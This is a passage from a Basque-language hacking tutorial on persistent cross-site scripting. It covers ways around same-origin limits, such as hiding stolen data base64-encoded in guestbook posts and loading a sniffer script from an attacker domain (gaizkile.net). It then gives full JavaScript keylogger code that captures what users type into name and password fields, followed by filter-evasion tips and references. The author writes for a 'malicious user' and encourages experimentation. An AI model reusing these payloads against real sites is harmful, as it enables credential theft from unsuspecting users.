eta erabiltzaile maltzur batentzat interesgarriena horixe da zalantzarik gabe.

Segurtasun babes honek arazoak eragiten dizkie web garapenean daudenei,
izan ere gerta daiteke aplikazio batek hirugarren webgune bati eskaerak egitea
beharrezko izatea. Honetarako irtenbide bat proxy antzeko zerbait jartzea litzateke
AJAX eskaerak bertara bideratzeko.

Erabiltzaile gaizkilea bezain zuhurra izan daiteke eta modu hauek izan ditzake
babes hau saihesteko:

* Begibistan geratzen dena, usnatu edo lapurtutako datuak web berdinera sartzea
litzateke. Guestbookaren kasuan beste sarrera bat sor zitekeen edukin horrekin,
nolabaiteko kodifikazio (base64 kasu) edo zifraketa bat sartuz datuak izkutatzeko.

* Beste aukera bat, oraindik probatu gabe daukadana, AJAX usnatzailea beste 
domeinu batetik sartzea litzateke eta datuak bertara bidali:
<script src="http://gaizkile.net/usnatzaile.js"></src>

* Javascript lengoaiaren ezaugarrietaz baliatuz (objektuei bideratutakoa da),
AJAX funtzioen bertsio propioak egin daitezke. Teknika interesgarri hau gune 
honetan azaltzen da, eta demoa primeran dabil:
http://myappsecurity.blogspot.com/2007/01/ajax-sniffer-prrof-of-concept.html




        (10.3). Datuak usnatzen
          ~~~~~~~~~~~~~~~~~~~


Hauxe usnatzaile baten adibidea litzateke. Baaai, badakit, hobekuntza asko 
sar daitezke.

 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Datuen usnaketa</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
</head>
<body>
<form name="formulario" method="post" action="bidali.php">
Izena:<input type="text" name="izena" value="" >
Pasahitza:<input type="password" name="pasahitza" value="" >
<input type="submit" name="bidali" value="Bidali" >
</form>
<script language="javascript">
      // keyDown gertaerarentzat euskarria definitzen dugu
      document.onkeydown = keyDownEuskarria; 
      
      // formulario bidaltzerakoan gure funtzioa exekutatuko da
      document.forms[0].onsubmit = erakutsi;
      
      var testua = "";

      // Datuak usnatzen dituen funtzioa
      // Hobetu daiteke
      function keyDownEuskarria (gertaera)
      {
                  // Gertaera eta sakatutako tekla jasotzen da
                  var gertaeraObj =window.event? event : gertaera;
                  var tekla = gertaeraObj.keyCode? gertaeraObj.keyCode : gertaeraObj.charCode;
                                    
                  var karakterea = String.fromCharCode(tekla).toLowerCase();
                  
                  // Tabulazioak gordetzen dira
                  if (tekla == 9) {karakterea = " <tab> ";}
                  
                  // Shift sakatzen bada kontutan hartzen da
                  if (gertaeraObj.shiftKey) { karakterea =  String.fromCharCode(tekla).toUpperCase(); }

                  //alert(tekla);
                  testua += "" + karakterea;
      }
      
      // Erakutsi harrapatutako datuak
      function erakutsi ()
      {
            alert("Harrapatutako testua: \n" + testua);
      }
            
</script>

</body>
</html>


      (11). Azken oharrak eta erreferentziak
      ~~~~~~~~~~~~~~~~~~~


Modu asko daude XSS arrakastatsu bat burutzeko. Errezena zuzenean kodea sartzea
litzateke, baina hori web aplikazioak sarrera datuen azterketarik egiten EZ duenean
soilik lor daiteke. Sarrera iragazten bada zailagoa izan daiteke baina iragazkiaren arabera
oraindik aukerak egon daitezke javascript kodea sartzeko.
Azterketa askotan <script> hitza bilatzen da, besterik gabe, baina horrekin ez da nahikoa
inolaz ere. Javascript-ekin ibili den edozeinek badaki kodea html etiketen ebentoekin sar
daitezkela. Aukera guztien bilgune itzela hemen:    http://ha.ckers.org/xss.html



Erreferentziak, webguneak, e.a...
 Paperak:
[+] CERT Advisory CA-2000-02 - Malicious HTML Tags Embedded in Client Web Requests
     url: http://www.cert.org/advisories/CA-2000-02.html
[+] DOM Based Cross Site Scripting or XSS of the Third Kind
     url: http://www.webappsec.org/projects/articles/071105.shtml

  bestelakoak...
[+] Bypassing JavaScript Filters the Flash! attack, EyeonSecurity, June 5 2002

[+] The HTML Form Protocol Attack, Jochen Topf, August 8 2001

[+] HOWTO: Prevent Cross-Site Scripting Security Issues (Q252985), Microsoft, February 1 2000

[+] Understanding Malicious Content Mitigation for Web Developers, CERT Coordination Center, February 2 2000

[+] URL Encoded Attacks, Internet Security Systems, Gunter Ollmann, April 1 2002

[+] Cross-site Scripting Overview, Microsoft, February 2 2000

[+] The Evolution of Cross-site Scripting Attacks, iDefence, David Edler, May 20 2002 

 Liburuak:
[+] Hacking Exposed Web Applications - McGraw Hill. 2002
[+] Web Hacking: Attacks and Defense - Addison Wesley. 2002, atzeratu xamarra 
     0tik hasteko egokia.
[+] Web Security & Commerce - O'Rielly. Atzeratua
[+] Javascript, the Definitive Guide. - O'Rielly
[+] Web Design in a Nutshell - O'Rielly

 Guneak
[+] Erasoen datubasea
     http://ha.ckers.org/xss.html
[+] DOM inplementazioa mozillaren eskutik
     http://developer.mozilla.org/en/docs/Gecko_DOM_Reference
 

Hauxe izan da dena. XSS-ren definizio formalagoa wikipedian irakur daiteke.
Artikulu honetan "persistent XSS" delakoa aztertzen da; URL baten bitartez ere
javascript kodea exekutarazi daiteke, baina azken finean erasoak berdinak izan
daitezke, gehienez ere erasoa pixkat izkutatu daiteke kodeak erabiliz. 
Horretarako bihurgailuak topa daitezke.

Espero dut hemendik aurrera interneten esperientzia interesgarriak bizitzeko
ideiak eman izatea. Esan bezala limite bakarra irudimena da. Ongi izan.
     
                               -Pello X-
     
<E0F>
